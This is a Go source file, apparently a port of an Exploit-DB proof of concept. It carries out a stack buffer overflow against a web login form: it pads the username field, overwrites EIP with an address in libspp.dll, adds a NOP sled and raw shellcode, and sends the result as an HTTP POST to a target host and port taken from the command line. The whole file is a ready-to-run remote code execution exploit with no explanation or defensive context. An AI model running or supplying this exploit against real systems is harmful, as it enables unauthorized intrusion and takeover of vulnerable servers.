// Original exploit: https://www.exploit-db.com/exploits/42928
package main

import (
  "strconv"
  "fmt"
  "os"
  "net"
)

func main() {
  dstHost := os.Args[1]
  dstPort := os.Args[2]
 
  var s string
  for i := 0; i < 780; i++ {
    s += "A"
  }
  // EIP: 0x10090c83 at libspp.dll
  s += "\x83\x0c\x09\x10"
  // nops
  for i := 0; i < 16; i++ {
    s += "\x90"
  }
  shellcode := ""
  shellcode += "\xdb\xcc\xbe\x2e\xa9\xbe\xeb\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
  shellcode += "\x52\x31\x75\x17\x83\xed\xfc\x03\x5b\xba\x5c\x1e\x5f\x54\x22"
  shellcode += "\xe1\x9f\xa5\x43\x6b\x7a\x94\x43\x0f\x0f\x87\x73\x5b\x5d\x24"
  shellcode += "\xff\x09\x75\xbf\x8d\x85\x7a\x08\x3b\xf0\xb5\x89\x10\xc0\xd4"
  shellcode += "\x09\x6b\x15\x36\x33\xa4\x68\x37\x74\xd9\x81\x65\x2d\x95\x34"
  shellcode += "\x99\x5a\xe3\x84\x12\x10\xe5\x8c\xc7\xe1\x04\xbc\x56\x79\x5f"
  shellcode += "\x1e\x59\xae\xeb\x17\x41\xb3\xd6\xee\xfa\x07\xac\xf0\x2a\x56"
  shellcode += "\x4d\x5e\x13\x56\xbc\x9e\x54\x51\x5f\xd5\xac\xa1\xe2\xee\x6b"
  shellcode += "\xdb\x38\x7a\x6f\x7b\xca\xdc\x4b\x7d\x1f\xba\x18\x71\xd4\xc8"
  shellcode += "\x46\x96\xeb\x1d\xfd\xa2\x60\xa0\xd1\x22\x32\x87\xf5\x6f\xe0"
  shellcode += "\xa6\xac\xd5\x47\xd6\xae\xb5\x38\x72\xa5\x58\x2c\x0f\xe4\x34"
  shellcode += "\x81\x22\x16\xc5\x8d\x35\x65\xf7\x12\xee\xe1\xbb\xdb\x28\xf6"
  shellcode += "\xbc\xf1\x8d\x68\x43\xfa\xed\xa1\x80\xae\xbd\xd9\x21\xcf\x55"
  shellcode += "\x19\xcd\x1a\xf9\x49\x61\xf5\xba\x39\xc1\xa5\x52\x53\xce\x9a"
  shellcode += "\x43\x5c\x04\xb3\xee\xa7\xcf\x7c\x46\xa6\x3c\x15\x95\xa8\x46"
  shellcode += "\x37\x10\x4e\x2c\xa7\x75\xd9\xd9\x5e\xdc\x91\x78\x9e\xca\xdc"
  shellcode += "\xbb\x14\xf9\x21\x75\xdd\x74\x31\xe2\x2d\xc3\x6b\xa5\x32\xf9"
  shellcode += "\x03\x29\xa0\x66\xd3\x24\xd9\x30\x84\x61\x2f\x49\x40\x9c\x16"
  shellcode += "\xe3\x76\x5d\xce\xcc\x32\xba\x33\xd2\xbb\x4f\x0f\xf0\xab\x89"
  shellcode += "\x90\xbc\x9f\x45\xc7\x6a\x49\x20\xb1\xdc\x23\xfa\x6e\xb7\xa3"
  shellcode += "\x7b\x5d\x08\xb5\x83\x88\xfe\x59\x35\x65\x47\x66\xfa\xe1\x4f"
  shellcode += "\x1f\xe6\x91\xb0\xca\xa2\xb2\x52\xde\xde\x5a\xcb\x8b\x62\x07"
  shellcode += "\xec\x66\xa0\x3e\x6f\x82\x59\xc5\x6f\xe7\x5c\x81\x37\x14\x2d"
  shellcode += "\x9a\xdd\x1a\x82\x9b\xf7"

  s += shellcode
  payload := "username=" + s + "&password=A" 

  buffer := "POST /login HTTP/1.1\r\n"
  buffer += fmt.Sprintf("Host: %s\r\n", dstHost)
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += fmt.Sprintf("Referer: http://%s/login\r\n", dstHost)
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += fmt.Sprintf("Content-Length: %s\r\n", strconv.Itoa(len(payload)))
  buffer += "\r\n"
  buffer += payload

  hostWithPort := fmt.Sprintf("%s:%s", dstHost, dstPort)
  fmt.Println("\nSending evil buffer...", hostWithPort)
  conn, err := net.Dial("tcp", hostWithPort)
  if err != nil {
    panic(err)
  }

  _, err = conn.Write([]byte(buffer))
  if err != nil {
    panic(err)
  }

  conn.Close()
}
